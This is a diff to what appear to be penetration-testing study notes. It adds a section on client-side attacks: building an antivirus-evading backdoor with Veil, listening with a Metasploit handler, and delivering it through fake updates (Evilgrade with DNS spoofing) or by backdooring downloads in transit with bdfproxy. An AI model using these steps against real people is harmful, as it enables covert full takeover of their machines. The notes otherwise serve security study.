@@ -165,7 +165,7 @@ Payloads are small pieces of code that will be executed on the target computer o
 * Show exploits, payloads, auxiliaries or options
   * `show [option]`
 * Use a certain exploit, payload or auxiliary
-  * `use [option]`
+  * `use [module]`
 * Configure [option] to have a value of [value]
   * `set [option] [value]`
 * Run the current task
@@ -207,3 +207,67 @@ Log in and put the activation key.
 
 After the setup go to home, create, site, add a name, the IP in assets and a group, 
 save & scan. Play with the tabs.
+
+## Client Side Attacks
+If you can't ping the target IP or it's hidden behind a router use this attack.
+
+It requires user interaction and Social Engineering is very important 
+as well as information gathering.
+
+### Veil
+Veil is a framework for generating undetectable backdoors.
+A backdoor is a file that gives full access over the machine that it gets executed on.
+
+[Click here](https://github.com/Veil-Framework/Veil) and clone it.
+
+#### Generate the backdoor
+* Got to the Veil directory and set up the program
+  * `./config/setup.sh --force --silent`
+* Start the program
+  * `Veil.py`
+* See available tools
+  * `list`
+* Use Evasion to create an undetectable backdoor
+  * `use 1`
+* See available payloads
+  * `list`
+* Use a playload
+  * `use [payload number]`
+* Configure the backdoor, set Lhost to your IP
+  * `set [option] [value]`
+  * `options`
+* Make the backdoor
+  * `generate`
+
+Check if your backdoor is being detected by anti-virus by going to
+[No Distribute](https://nodistribute.com/) and upload yout file.
+
+#### Listen for incomming connections
+* Listen with metasploit
+  * `msfconsole`
+  * `use exploit/multi/handler`
+  * `show options`
+  * Set the correct the correct payload, Lhost and Lport, and then exploit.
+#### Deliver the backdoor by a fake update
+Fake an update for an already installed program.
+
+Install backdoor instead of the update.
+
+Requires DNS spoofing + Evilgrade (a server to serve the update).
+
+* Install Evilgrade
+* Check programs that can be hijacked
+  * `show modules`
+* Select a program
+  * `configure [module]`
+  * `show options`
+* Set backdoor location and other options if you want
+  * `set agent [backdoor location]`
+* Start server
+  * `start`
+* Start dns spoofing and handler by setting any updates requests to evilgrade (your IP).
+
+#### Deliver the backdoor by backdooring downloads on the fly
+Backdoor any .exe file that the target downloads using the Backdoor Factory Proxy (bdfproxy).
+
+We need to be in the middle of the connection.
